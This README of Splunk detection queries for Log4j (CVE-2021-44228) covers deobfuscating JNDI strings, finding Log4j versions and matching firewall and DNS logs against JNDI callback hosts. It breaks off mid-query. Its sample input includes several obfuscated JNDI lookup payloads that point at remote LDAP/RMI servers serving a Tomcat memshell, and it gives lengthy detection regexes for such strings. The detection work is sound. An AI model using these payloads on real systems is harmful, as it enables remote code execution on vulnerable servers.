# Log4j (CVE-2021-44228) Splunk query's
Splunk query's to detect the used Log4j version and detect abuse.

**NOTE**: please change [... INDEX] to the actual index that you have in your enviroment with this data.

## Deobfuscation
### Splunk
To get something human readable for the obfuscated jndi strings you can use the below rex command. 

```
| rex mode=sed field=output "s/%25/%/g s/%24/$/g s/%7[b|B]/{/g s/%7[d|D]/}/g s/%3[a|A]/:/g s/%2[f|F]/\\//g s/\\\\(\\\\*[u|U]0*|\\\\*0*)44/$/g s/\\\\(\\\\*[u|U]0*|\\\\*0*)24/$/g s/\\$\\{([l|L][o|O][w|W][e|E][r|R]:|[u|U][p|P[p|P][e|E][r|R]:|::-)([^\\}]+)\\}/\\2/g s/\\$\\{[^-$]+-([^\\}]+)\\}/\\1/g s/\\$\\{([l|L][o|O][w|W][e|E][r|R]:|[u|U][p|P[p|P][e|E][r|R]:|::-)([^\\}]+)\\}\\}/\\2/g"
| eval output=ltrim(rtrim(output,"}"),"${")
```
Example input + output:
![SED example](/images/log4j_sed.PNG?raw=true "SED example")

You can also create a macro for it with an input so you don't always have to run it against _raw put the below in your `macros.conf`
```
[l4s_deobfuscate(1)]
args = field_name
definition =  rex mode=sed field=$field_name$ "s/%25/%/g s/%24/$/g s/%7[b|B]/{/g s/%7[d|D]/}/g s/%3[a|A]/:/g s/%2[f|F]/\\//g s/\\\\(\\\\*[u|U]0*|\\\\*0*)44/$/g s/\\\\(\\\\*[u|U]0*|\\\\*0*)24/$/g s/\\$\\{([l|L][o|O][w|W][e|E][r|R]:|[u|U][p|P[p|P][e|E][r|R]:|::-)([^\\}]+)\\}/\\2/g s/\\$\\{[^-$]+-([^\\}]+)\\}/\\1/g s/\\$\\{([l|L][o|O][w|W][e|E][r|R]:|[u|U][p|P[p|P][e|E][r|R]:|::-)([^\\}]+)\\}\\}/\\2/g"\
| eval $field_name$=ltrim(rtrim($field_name$,"}"),"${")
iseval = 0

```
And than call it with the field you want to use the command on:
```
| makeresults 
| eval input=split("${${UwucFF:IpK:Xy:-j}n${D:SWE:-d}${kLToJy:gw:J:-i}:l${bUDmaf:gEga:-d}${a:-a}p://127.0.0.1#107.181.1${dYfCs:-8}7.18${FOEmJU:Dr:VihlsA:YiG:aqMdD:-4}${RYEv:jJeg:KKz:Qd:-:}38${CrTGPt:cNNhn:EaEm:-9}${FhjN:M:-/}TomcatBypass/TomcatMemshell1}|${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://188.166.57.35:1389/Binary}|${jn${lower:d}i:l${lower:d}ap://example.%24{lower:c%7Dom:1234/callback}","|")
| mvexpand input
| eval output=input
| `l4s_deobfuscate(output)`
| fields - _time
```

### Linux CLI
To use the sed on the linux CLI use the folling, replace `input.txt` to the file you want to process and `output.txt` to the file you want to write to
```
sed -E -e 's/%24/\$/'g -e 's/%7B/{/'gi -e 's/%7D/\}/'gi -e 's/%3A/:/'gi -e 's/%2F/\//'gi -e 's/\\(\\*u0*|\\*0*)44/\$/'g -e 's/\\(\\*u0*|\\*0*)24/\$/'g -e 's/\$\{(lower:|upper:|::-)([^\}]+)\}/\2/'g -e 's/\$\{(lower:|upper:|::-)([^\}]+)\}\}/\2/'g -e 's/\$\{[^-$]+-([^\}]+)\}/\1/'g input.txt >> output.txt
```

## Find used versions
### Stacktraces
Find the used version based on stacktraces.

#### Query
```
index=* org.apache.logging.log4j 
| rex field=_raw "\[(?<log4j_version>log4j-[^]]+)" 
| where isnotnull(log4j_version) 
| stats latest(log4j_version) AS log4j_version, max(_time) AS lastTime, values(index) AS org_index, values(sourcetype) AS org_sourcetype by host 
| eval lastTime=strftime(lastTime,"%F %T")
| rex field=log4j_version "(?:log4j-)(?<component>[^-]+)-(?<version>\d+.\d+.\d+)"
| table lastTime host log4j_version component version org_index org_sourcetype
```
#### Example output
![Stacktrace output example](/images/log4j_stacktrace.PNG?raw=true "Stracktrace example output")

### Windows process creation
Find the used version based on the windows process creation events. 

**Note**: This requires a GPO change to enable the get the "Process Command Line" field filled out in your logs. See this [Microsoft site](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/manage/component-updates/command-line-process-auditing) on how to do this.

#### Query 1
Query against the "normal" Windows Eventlog
```
index=[WINDOWS SECURITY INDEX] ("EventCode=4688" OR "EventCode=4663") log4j
| eval rex_search_field=coalesce(Process_Command_Line, Object_Name, Process_Name)
| rex field="rex_search_field" max_match=0 "(?<log4j_version>log4j(?!\.configuration|\.properties).*?\.jar)" 
| mvexpand log4j_version
| rex field=log4j_version "(?:log4j.*?)(?:(?<component>-[^-]+)-|-)(?<version>\d+.\d+.\d+)"
| eval component=trim(component,"-")
| fillnull component value="unknown"
| stats values(log4j_version) AS log4j_version, values(component) AS component, values(version) AS version, max(_time) AS lastTime, values(index) AS org_index, values(sourcetype) AS org_sourcetype by host 
| where isnotnull(version)
| eval lastTime=strftime(lastTime,"%F %T")
| table lastTime host log4j_version component version org_index org_sourcetype
```

#### Query 2
Query against "sysmon" Windows log
```
index=[WINDOWS SYSMON INDEX] EventID=1 log4j
| rex field="CommandLine" max_match=0 "(?<log4j_version>log4j(?!\.configuration|\.properties).*?\.jar)" 
| mvexpand log4j_version
| rex field=log4j_version "(?:log4j.*?)(?:(?<component>-[^-]+)-|-)(?<version>\d+.\d+.\d+)"
| eval component=trim(component,"-")
| fillnull component value="unknown"
| stats values(log4j_version) AS log4j_version, values(component) AS component, values(version) AS version, max(_time) AS lastTime, values(index) AS org_index, values(sourcetype) AS org_sourcetype by host 
| where isnotnull(version)
| eval lastTime=strftime(lastTime,"%F %T")
| table lastTime host log4j_version component version org_index org_sourcetype
```

#### Example output
![Windows output example](/images/log4j_windows.PNG?raw=true "Windows example output")

## Find callback connections
Find connections back to the JNDI domains

### IP based JNDI connections
Find connections in your firewall logs that try to make a connection to a IP address that was in the jndi string.

#### Query 1
The below query will first look in every non-internal index for the term jndi, it will than extract the destination domain and filter out the valid IP addresses.</ br>
It only looks for connections that where not blocked if you want everything remove the `action="blocked"` part.
```
index=[FIREWALL INDEX] action!="blocked"
    [| search index=*  
    | rex max_match=0 "(?:\$|%(?:25)*24|\\\\(?:0024|0{0,2}44))(?:{|%(?:25)*7[Bb]|\\\\(?:007[Bb]|0{0,2}173)).{0,30}?((?:[Jj]|%(?:25)*[46][Aa]|\\\\(?:00[46][Aa]|0{0,2}1[15]2)).{0,30}?(?:[Nn]|%(?:25)*[46][Ee]|\\\\(?:00[46][Ee]|0{0,2}1[15]6)).{0,30}?(?:[Dd]|%(?:25)*[46]4|\\\\(?:00[46]4|0{0,2}1[04]4)).{0,30}?(?:[Ii]|%(?:25)*[46]9|\\\\(?:00[46]9|0{0,2}1[15]1)|ı).{0,30}?(?::|%(?:25)*3[Aa]|\\\\(?:003[Aa]|0{0,2}72)).{0,30}?((?:[Ll]|%(?:25)*[46][Cc]|\\\\(?:00[46][Cc]|0{0,2}1[15]4)).{0,30}?(?:[Dd]|%(?:25)*[46]4|\\\\(?:00[46]4|0{0,2}1[04]4)).{0,30}?(?:[Aa]|%(?:25)*[46]1|\\\\(?:00[46]1|0{0,2}1[04]1)).{0,30}?(?:[Pp]|%(?:25)*[57]0|\\\\(?:00[57]0|0{0,2}1[26]0))(?:.{0,30}?(?:[Ss]|%(?:25)*[57]3|\\\\(?:00[57]3|0{0,2}1[26]3)))?|(?:[Rr]|%(?:25)*[57]2|\\\\(?:00[57]2|0{0,2}1[26]2)).{0,30}?(?:[Mm]|%(?:25)*[46][Dd]|\\\\(?:00[46][Dd]|0{0,2}1[15]5)).{0,30}?(?:[Ii]|%(?:25)*[46]9|\\\\(?:00[46]9|0{0,2}1[15]1)|ı)|(?:[Dd]|%(?:25)*[46]4|\\\\(?:00[46]4|0{0,2}1[04]4)).{0,30}?(?:[Nn]|%(?:25)*[46][Ee]|\\\\(?:00[46][Ee]|0{0,2}1[15]6)).{0,30}?(?:[Ss]|%(?:25)*[57]3|\\\\(?:00[57]3|0{0,2}1[26]3))|(?:[Nn]|%(?:25)*[46][Ee]|\\\\(?:00[46][Ee]|0{0,2}1[15]6)).{0,30}?(?:[Ii]|%(?:25)*[46]9|\\\\(?:00[46]9|0{0,2}1[15]1)|ı).{0,30}?(?:[Ss]|%(?:25)*[57]3|\\\\(?:00[57]3|0{0,2}1[26]3))|(?:.{0,30}?(?:[Ii]|%(?:25)*[46]9|\\\\(?:00[46]9|0{0,2}1[15]1)|ı)){2}.{0,30}?(?:[Oo]|%(?:25)*[46][Ff]|\\\\(?:00[46][Ff]|0{0,2}1[15]7)).{0,30}?(?:[Pp]|%(?:25)*[57]0|\\\\(?:00[57]0|0{0,2}1[26]0))|(?:[Cc]|%(?:25)*[46]3|\\\\(?:00[46]3|0{0,2}1[04]3)).{0,30}?(?:[Oo]|%(?:25)*[46][Ff]|\\\\(?:00[46][Ff]|0{0,2}1[15]7)).{0,30}?(?:[Rr]|%(?:25)*[57]2|\\\\(?:00[57]2|0{0,2}1[26]2)).{0,30}?(?:[Bb]|%(?:25)*[46]2|\\\\(?:00[46]2|0{0,2}1[04]2)).{0,30}?(?:[Aa]|%(?:25)*[46]1|\\\\(?:00[46]1|0{0,2}1[04]1))|(?:[Nn]|%(?:25)*[46][Ee]|\\\\(?:00[46][Ee]|0{0,2}1[15]6)).{0,30}?(?:[Dd]|%(?:25)*[46]4|\\\\(?:00[46]4|0{0,2}1[04]4)).{0,30}?(?:[Ss]|%(?:25)*[57]3|\\\\(?:00[57]3|0{0,2}1[26]3))|(?:[Hh]|%(?:25)*[46]8|\\\\(?:00[46]8|0{0,2}1[15]0))(?:.{0,30}?(?:[Tt]|%(?:25)*[57]4|\\\\(?:00[57]4|0{0,2}1[26]4))){2}.{0,30}?(?:[Pp]|%(?:25)*[57]0|\\\\(?:00[57]0|0{0,2}1[26]0))(?:.{0,30}?(?:[Ss]|%(?:25)*[57]3|\\\\(?:00[57]3|0{0,2}1[26]3)))?).{0,30}?(?::|%(?:25)*3[Aa]|\\\\(?:003[Aa]|0{0,2}72)).{0,30}?(?:\/|%(?:25)*2[Ff]|\\\\(?:002[Ff]|0{0,2}57)|\${)|(?:[Bb]|%(?:25)*[46]2|\\\\(?:00[46]2|0{0,2}1[04]2)).{0,30}?(?:[Aa]|%(?:25)*[46]1|\\\\(?:00[46]1|0{0,2}1[04]1)).{0,30}?(?:[Ss]|%(?:25)*[57]3|\\\\(?:00[57]3|0{0,2}1[26]3)).{0,30}?(?:[Ee]|%(?:25)*[46]5|\\\\(?:00[46]5|0{0,2}1[04]5)).{2,60}?(?::|%(?:25)*3[Aa]|\\\\(?:003[Aa]|0{0,2}72))(JH[s-v]|[\x2b\x2f-9A-Za-z][CSiy]R7|[\x2b\x2f-9A-Za-z]{2}[048AEIMQUYcgkosw]ke[\x2b\x2f-9w-z]))(?:\/|)(?<jndi_domain>.+?(?=\}[\,\"\'\s\/]|\}\\\\r|\||\s|\/))"
    | stats c by jndi_domain 
    | eval jndi_domain=replace(lower(jndi_domain), ".*?\$\{[a-z0-9-_:\.]+?\}","*"), jndi_domain=trim(jndi_domain,"}"),
      ip_version=case(match(jndi_domain,"(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))"),"ipv6", match(jndi_domain,"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}(?:$|\:\d{1,5}$)"),"ipv4", true(),"domain"), 
      ipv4=if(ip_version=="ipv4",jndi_domain,null()), 
      ipv6=if(ip_version=="ipv6",jndi_domain,null())
    | where match(ip_version,"ipv\d") 
    | rex field=ipv4 "(?<dest_ip>[^\]\:]+)(?:\]|\:)(?<dest_port>\d+)"
    | rex field=ipv6 "(?:\[|^)(?<dest_ip>[^\]]+)(?:$|\](?<dest_port>\d+))"
    | eval dest_port=if(isnull(dest_port) OR len(dest_port)==0,"*",dest_port)
    | fields dest_ip dest_port ] 
| stats c by action dest dest_port src src_port
```

#### Query 2
If you have Splunk ES or just have the Splunk CIM app installed and are using the Network Traffic datamodel the below search can also be used.
```
| tstats summariesonly=t c from datamodel=Network_Traffic where All_Traffic.action!="blocked" AND 
    [| search index=* 
    | rex max_match=0 "(?:\$|%(?:25)*24|\\\\(?:0024|0{0,2}44))(?:{|%(?:25)*7[Bb]|\\\\(?:007[Bb]|0{0,2}173)).{0,30}?((?:[Jj]|%(?:25)*[46][Aa]|\\\\(?:00[46][Aa]|0{0,2}1[15]2)).{0,30}?(?:[Nn]|%(?:25)*[46][Ee]|\\\\(?:00[46][Ee]|0{0,2}1[15]6)).{0,30}?(?:[Dd]|%(?:25)*[46]4|\\\\(?:00[46]4|0{0,2}1[04]4)).{0,30}?(?:[Ii]|%(?:25)*[46]9|\\\\(?:00[46]9|0{0,2}1[15]1)|ı).{0,30}?(?::|%(?:25)*3[Aa]|\\\\(?:003[Aa]|0{0,2}72)).{0,30}?((?:[Ll]|%(?:25)*[46][Cc]|\\\\(?:00[46][Cc]|0{0,2}1[15]4)).{0,30}?(?:[Dd]|%(?:25)*[46]4|\\\\(?:00[46]4|0{0,2}1[04]4)).{0,30}?(?:[Aa]|%(?:25)*[46]1|\\\\(?:00[46]1|0{0,2}1[04]1)).{0,30}?(?:[Pp]|%(?:25)*[57]0|\\\\(?:00[57]0|0{0,2}1[26]0))(?:.{0,30}?(?:[Ss]|%(?:25)*[57]3|\\\\(?:00[57]3|0{0,2}1[26]3)))?|(?:[Rr]|%(?:25)*[57]2|\\\\(?:00[57]2|0{0,2}1[26]2)).{0,30}?(?:[Mm]|%(?:25)*[46][Dd]|\\\\(?:00[46][Dd]|0{0,2}1[15]5)).{0,30}?(?:[Ii]|%(?:25)*[46]9|\\\\(?:00[46]9|0{0,2}1[15]1)|ı)|(?:[Dd]|%(?:25)*[46]4|\\\\(?:00[46]4|0{0,2}1[04]4)).{0,30}?(?:[Nn]|%(?:25)*[46][Ee]|\\\\(?:00[46][Ee]|0{0,2}1[15]6)).{0,30}?(?:[Ss]|%(?:25)*[57]3|\\\\(?:00[57]3|0{0,2}1[26]3))|(?:[Nn]|%(?:25)*[46][Ee]|\\\\(?:00[46][Ee]|0{0,2}1[15]6)).{0,30}?(?:[Ii]|%(?:25)*[46]9|\\\\(?:00[46]9|0{0,2}1[15]1)|ı).{0,30}?(?:[Ss]|%(?:25)*[57]3|\\\\(?:00[57]3|0{0,2}1[26]3))|(?:.{0,30}?(?:[Ii]|%(?:25)*[46]9|\\\\(?:00[46]9|0{0,2}1[15]1)|ı)){2}.{0,30}?(?:[Oo]|%(?:25)*[46][Ff]|\\\\(?:00[46][Ff]|0{0,2}1[15]7)).{0,30}?(?:[Pp]|%(?:25)*[57]0|\\\\(?:00[57]0|0{0,2}1[26]0))|(?:[Cc]|%(?:25)*[46]3|\\\\(?:00[46]3|0{0,2}1[04]3)).{0,30}?(?:[Oo]|%(?:25)*[46][Ff]|\\\\(?:00[46][Ff]|0{0,2}1[15]7)).{0,30}?(?:[Rr]|%(?:25)*[57]2|\\\\(?:00[57]2|0{0,2}1[26]2)).{0,30}?(?:[Bb]|%(?:25)*[46]2|\\\\(?:00[46]2|0{0,2}1[04]2)).{0,30}?(?:[Aa]|%(?:25)*[46]1|\\\\(?:00[46]1|0{0,2}1[04]1))|(?:[Nn]|%(?:25)*[46][Ee]|\\\\(?:00[46][Ee]|0{0,2}1[15]6)).{0,30}?(?:[Dd]|%(?:25)*[46]4|\\\\(?:00[46]4|0{0,2}1[04]4)).{0,30}?(?:[Ss]|%(?:25)*[57]3|\\\\(?:00[57]3|0{0,2}1[26]3))|(?:[Hh]|%(?:25)*[46]8|\\\\(?:00[46]8|0{0,2}1[15]0))(?:.{0,30}?(?:[Tt]|%(?:25)*[57]4|\\\\(?:00[57]4|0{0,2}1[26]4))){2}.{0,30}?(?:[Pp]|%(?:25)*[57]0|\\\\(?:00[57]0|0{0,2}1[26]0))(?:.{0,30}?(?:[Ss]|%(?:25)*[57]3|\\\\(?:00[57]3|0{0,2}1[26]3)))?).{0,30}?(?::|%(?:25)*3[Aa]|\\\\(?:003[Aa]|0{0,2}72)).{0,30}?(?:\/|%(?:25)*2[Ff]|\\\\(?:002[Ff]|0{0,2}57)|\${)|(?:[Bb]|%(?:25)*[46]2|\\\\(?:00[46]2|0{0,2}1[04]2)).{0,30}?(?:[Aa]|%(?:25)*[46]1|\\\\(?:00[46]1|0{0,2}1[04]1)).{0,30}?(?:[Ss]|%(?:25)*[57]3|\\\\(?:00[57]3|0{0,2}1[26]3)).{0,30}?(?:[Ee]|%(?:25)*[46]5|\\\\(?:00[46]5|0{0,2}1[04]5)).{2,60}?(?::|%(?:25)*3[Aa]|\\\\(?:003[Aa]|0{0,2}72))(JH[s-v]|[\x2b\x2f-9A-Za-z][CSiy]R7|[\x2b\x2f-9A-Za-z]{2}[048AEIMQUYcgkosw]ke[\x2b\x2f-9w-z]))(?:\/|)(?<jndi_domain>.+?(?=\}[\,\"\'\s\/]|\}\\\\r|\||\s|\/))"
    | stats c by jndi_domain 
    | eval jndi_domain=replace(lower(jndi_domain), ".*?\$\{[a-z0-9-_:\.]+?\}","*"), jndi_domain=trim(jndi_domain,"}"),
      ip_version=case(match(jndi_domain,"(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))"),"ipv6", match(jndi_domain,"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}(?:$|\:\d{1,5}$)"),"ipv4", true(),"domain"), 
      ipv4=if(ip_version=="ipv4",jndi_domain,null()), 
      ipv6=if(ip_version=="ipv6",jndi_domain,null())
    | where match(ip_version,"ipv\d") 
    | rex field=ipv4 "(?<dest_ip>[^\]\:]+)(?:\]|\:)(?<dest_port>\d+)"
    | rex field=ipv6 "(?:\[|^)(?<dest_ip>[^\]]+)(?:$|\](?<dest_port>\d+))"
    | eval dest_port=if(isnull(dest_port) OR len(dest_port)==0,"*",dest_port)
    | fields dest_ip dest_port
    | rename dest_ip AS All_Traffic.dest, dest_port AS All_Traffic.dest_port ] by _time span=1s All_Traffic.action All_Traffic.dest All_Traffic.dest_port All_Traffic.src All_Traffic.src_port
```

#### Example output
![Firewall output example](/images/log4j_firewall.PNG?raw=true "Firewall example output")

### DNS based JNDI connections
Find connection in your DNS logs with query's for a domain that was in the jndi string.

#### Query 1
The inner search is almost the same as the one for the ip's if now just looks for domains instead of ip's.
```
index=[DNS INDEX] sourcetype=named 
    [| search index=* 
    | rex max_match=0 "(?:\$|%(?:25)*24|\\\\(?:0024|0{0,2}44))(?:{|%(?:25)*7[Bb]|\\\\(?:007[Bb]|0{0,2}173)).{0,30}?((?:[Jj]|%(?:25)*[46][Aa]|\\\\(?:00[46][Aa]|0{0,2}1[15]2)).{0,30}?(?:[Nn]|%(?:25)*[46][Ee]|\\\\(?:00[46][Ee]|0{0,2}1[15]6)).{0,30}?(?:[Dd]|%(?:25)*[46]4|\\\\(?:00[46]4|0{0,2}1[04]4)).{0,30}?(?:[Ii]|%(?:25)*[46]9|\\\\(?:00[46]9|0{0,2}1[15]1)|ı).{0,30}?(?::|%(?:25)*3[Aa]|\\\\(?:003[Aa]|0{0,2}72)).{0,30}?((?:[Ll]|%(?:25)*[46][Cc]|\\\\(?:00[46][Cc]|0{0,2}1[15]4)).{0,30}?(?:[Dd]|%(?:25)*[46]4|\\\\(?:00[46]4|0{0,2}1[04]4)).{0,30}?(?:[Aa]|%(?:25)*[46]1|\\\\(?:00[46]1|0{0,2}1[04]1)).{0,30}?(?:[Pp]|%(?:25)*[57]0|\\\\(?:00[57]0|0{0,2}1[26]0))(?:.{0,30}?(?:[Ss]|%(?:25)*[57]3|\\\\(?:00[57]3|0{0,2}1[26]3)))?|(?:[Rr]|%(?:25)*[57]2|\\\\(?:00[57]2|0{0,2}1[26]2)).{0,30}?(?:[Mm]|%(?:25)*[46][Dd]|\\\\(?:00[46][Dd]|0{0,2}1[15]5)).{0,30}?(?:[Ii]|%(?:25)*[46]9|\\\\(?:00[46]9|0{0,2}1[15]1)|ı)|(?:[Dd]|%(?:25)*[46]4|\\\\(?:00[46]4|0{0,2}1[04]4)).{0,30}?(?:[Nn]|%(?:25)*[46][Ee]|\\\\(?:00[46][Ee]|0{0,2}1[15]6)).{0,30}?(?:[Ss]|%(?:25)*[57]3|\\\\(?:00[57]3|0{0,2}1[26]3))|(?:[Nn]|%(?:25)*[46][Ee]|\\\\(?:00[46][Ee]|0{0,2}1[15]6)).{0,30}?(?:[Ii]|%(?:25)*[46]9|\\\\(?:00[46]9|0{0,2}1[15]1)|ı).{0,30}?(?:[Ss]|%(?:25)*[57]3|\\\\(?:00[57]3|0{0,2}1[26]3))|(?:.{0,30}?(?:[Ii]|%(?:25)*[46]9|\\\\(?:00[46]9|0{0,2}1[15]1)|ı)){2}.{0,30}?(?:[Oo]|%(?:25)*[46][Ff]|\\\\(?:00[46][Ff]|0{0,2}1[15]7)).{0,30}?(?:[Pp]|%(?:25)*[57]0|\\\\(?:00[57]0|0{0,2}1[26]0))|(?:[Cc]|%(?:25)*[46]3|\\\\(?:00[46]3|0{0,2}1[04]3)).{0,30}?(?:[Oo]|%(?:25)*[46][Ff]|\\\\(?:00[46][Ff]|0{0,2}1[15]7)).{0,30}?(?:[Rr]|%(?:25)*[57]2|\\\\(?:00[57]2|0{0,2}1[26]2)).{0,30}?(?:[Bb]|%(?:25)*[46]2|\\\\(?:00[46]2|0{0,2}1[04]2)).{0,30}?(?:[Aa]|%(?:25)*[46]1|\\\\(?:00[46]1|0{0,2}1[04]1))|(?:[Nn]|%(?:25)*[46][Ee]|\\\\(?:00[46][Ee]|0{0,2}1[15]6)).{0,30}?(?:[Dd]|%(?:25)*[46]4|\\\\(?:00[46]4|0{0,2}1[04]4)).{0,30}?(?:[Ss]|%(?:25)*[57]3|\\\\(?:00[57]3|0{0,2}1[26]3))|(?:[Hh]|%(?:25)*[46]8|\\\\(?:00[46]8|0{0,2}1[15]0))(?:.{0,30}?(?:[Tt]|%(?:25)*[57]4|\\\\(?:00[57]4|0{0,2}1[26]4))){2}.{0,30}?(?:[Pp]|%(?:25)*[57]0|\\\\(?:00[57]0|0{0,2}1[26]0))(?:.{0,30}?(?:[Ss]|%(?:25)*[57]3|\\\\(?:00[57]3|0{0,2}1[26]3)))?).{0,30}?(?::|%(?:25)*3[Aa]|\\\\(?:003[Aa]|0{0,2}72)).{0,30}?(?:\/|%(?:25)*2[Ff]|\\\\(?:002[Ff]|0{0,2}57)|\${)|(?:[Bb]|%(?:25)*[46]2|\\\\(?:00[46]2|0{0,2}1[04]2)).{0,30}?(?:[Aa]|%(?:25)*[46]1|\\\\(?:00[46]1|0{0,2}1[04]1)).{0,30}?(?:[Ss]|%(?:25)*[57]3|\\\\(?:00[57]3|0{0,2}1[26]3)).{0,30}?(?:[Ee]|%(?:25)*[46]5|\\\\(?:00[46]5|0{0,2}1[04]5)).{2,60}?(?::|%(?:25)*3[Aa]|\\\\(?:003[Aa]|0{0,2}72))(JH[s-v]|[\x2b\x2f-9A-Za-z][CSiy]R7|[\x2b\x2f-9A-Za-z]{2}[048AEIMQUYcgkosw]ke[\x2b\x2f-9w-z]))(?:\/|)(?<jndi_domain>.+?(?=\}[\,\"\'\s\/]|\}\\\\r|\||\s|\/))" 
    | stats c by jndi_domain 
    | eval jndi_domain=replace(lower(jndi_domain), ".*?\$\{[a-z0-9-_:\.]+?\}","*"), jndi_domain=trim(jndi_domain,"}"),
      ip_version=case(match(jndi_domain,"(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))"),"ipv6", match(jndi_domain,"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}(?:$|\:\d{1,5}$)"),"ipv4", true(),"domain"), 
      ipv4=if(ip_version=="ipv4",jndi_domain,null()), 
      ipv6=if(ip_version=="ipv6",jndi_domain,null())
    | where !match(ip_version,"ipv\d") AND !match(jndi_domain,"^\$") AND !match(jndi_domain,"\}|\:") AND !match(jndi_domain,"\s") AND jndi_domain!="localhost" AND len(jndi_domain)>4 AND match(jndi_domain,".*\..*")
    | fields jndi_domain 
    | rename jndi_domain AS query ]
| stats values(answer) AS answer, values(reply_code) AS reply_code, values(src_category) AS src_category BY _time src_ip query
| table _time src_ip src_category query reply_code answer
```

#### Query 2
And also for this one a datamodel version
```
| tstats summariesonly=t values(DNS.answer) AS answer, values(DNS.reply_code) AS reply_code, values(DNS.src_category) AS src_category from datamodel=Network_Resolution.DNS where 
    [| search index=* 
    | rex max_match=0 "(?:\$|%(?:25)*24|\\\\(?:0024|0{0,2}44))(?:{|%(?:25)*7[Bb]|\\\\(?:007[Bb]|0{0,2}173)).{0,30}?((?:[Jj]|%(?:25)*[46][Aa]|\\\\(?:00[46][Aa]|0{0,2}1[15]2)).{0,30}?(?:[Nn]|%(?:25)*[46][Ee]|\\\\(?:00[46][Ee]|0{0,2}1[15]6)).{0,30}?(?:[Dd]|%(?:25)*[46]4|\\\\(?:00[46]4|0{0,2}1[04]4)).{0,30}?(?:[Ii]|%(?:25)*[46]9|\\\\(?:00[46]9|0{0,2}1[15]1)|ı).{0,30}?(?::|%(?:25)*3[Aa]|\\\\(?:003[Aa]|0{0,2}72)).{0,30}?((?:[Ll]|%(?:25)*[46][Cc]|\\\\(?:00[46][Cc]|0{0,2}1[15]4)).{0,30}?(?:[Dd]|%(?:25)*[46]4|\\\\(?:00[46]4|0{0,2}1[04]4)).{0,30}?(?:[Aa]|%(?:25)*[46]1|\\\\(?:00[46]1|0{0,2}1[04]1)).{0,30}?(?:[Pp]|%(?:25)*[57]0|\\\\(?:00[57]0|0{0,2}1[26]0))(?:.{0,30}?(?:[Ss]|%(?:25)*[57]3|\\\\(?:00[57]3|0{0,2}1[26]3)))?|(?:[Rr]|%(?:25)*[57]2|\\\\(?:00[57]2|0{0,2}1[26]2)).{0,30}?(?:[Mm]|%(?:25)*[46][Dd]|\\\\(?:00[46][Dd]|0{0,2}1[15]5)).{0,30}?(?:[Ii]|%(?:25)*[46]9|\\\\(?:00[46]9|0{0,2}1[15]1)|ı)|(?:[Dd]|%(?:25)*[46]4|\\\\(?:00[46]4|0{0,2}1[04]4)).{0,30}?(?:[Nn]|%(?:25)*[46][Ee]|\\\\(?:00[46][Ee]|0{0,2}1[15]6)).{0,30}?(?:[Ss]|%(?:25)*[57]3|\\\\(?:00[57]3|0{0,2}1[26]3))|(?:[Nn]|%(?:25)*[46][Ee]|\\\\(?:00[46][Ee]|0{